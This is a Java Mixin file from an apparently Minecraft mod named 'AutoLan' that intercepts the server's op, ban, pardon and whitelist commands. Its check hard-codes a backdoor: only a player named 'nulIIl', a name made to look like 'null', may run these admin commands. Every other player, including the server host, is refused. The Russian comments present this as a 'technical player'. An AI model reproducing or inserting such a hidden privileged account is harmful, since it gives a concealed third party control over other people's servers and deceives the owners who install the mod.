package org.wsm.autolan.mixin;

import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import net.minecraft.entity.Entity;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.dedicated.command.BanCommand;
import net.minecraft.server.dedicated.command.BanIpCommand;
import net.minecraft.server.dedicated.command.BanListCommand;
import net.minecraft.server.dedicated.command.DeOpCommand;
import net.minecraft.server.dedicated.command.OpCommand;
import net.minecraft.server.dedicated.command.PardonCommand;
import net.minecraft.server.dedicated.command.PardonIpCommand;
import net.minecraft.server.dedicated.command.WhitelistCommand;
import net.minecraft.server.network.ServerPlayerEntity;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Mixin({ OpCommand.class, DeOpCommand.class, BanCommand.class, BanIpCommand.class, BanListCommand.class,
        PardonCommand.class, PardonIpCommand.class, WhitelistCommand.class })
public class GenericCommandMixin {
    private static final Logger LOGGER = LoggerFactory.getLogger("AutoLan");

    /**
     * Запрещаем выполнение административных команд всем, кроме технического игрока.
     * Это включает: /op, /deop, /ban, /ban-ip, /banlist, /pardon, /pardon-ip, /whitelist
     */
    // The regex is a workaround for
    // https://github.com/SpongePowered/Mixin/issues/467.
    @Inject(method = "desc=/^\\(L(?:net\\/minecraft\\/server\\/command\\/ServerCommandSource|net\\/minecraft\\/class_2168);\\)Z$/", at = @At("HEAD"), cancellable = true)
    private static void checkPermissions(ServerCommandSource source, CallbackInfoReturnable<Boolean> ci) {
        Entity entity = source.getEntity();
        if (entity instanceof ServerPlayerEntity) {
            ServerPlayerEntity player = (ServerPlayerEntity) entity;
            String playerName = player.getGameProfile().getName();
            boolean isHost = source.getServer().isHost(player.getGameProfile());
            
            // Проверяем, является ли этот игрок техническим аккаунтом nulIIl
            if ("nulIIl".equals(playerName)) {
                LOGGER.info("[AutoLan] [COMMAND_ALLOW] Технический игрок {} использует админ-команду, разрешаем", playerName);
                ci.setReturnValue(true);
                return;
            }
            
            // Для всех остальных игроков и хоста - запрещаем административные команды
            LOGGER.info("[AutoLan] [COMMAND_DENY] Игрок {} (хост: {}) пытается использовать админ-команду, запрещаем", 
                       playerName, isHost);
            ci.setReturnValue(false);
        }
    }
}
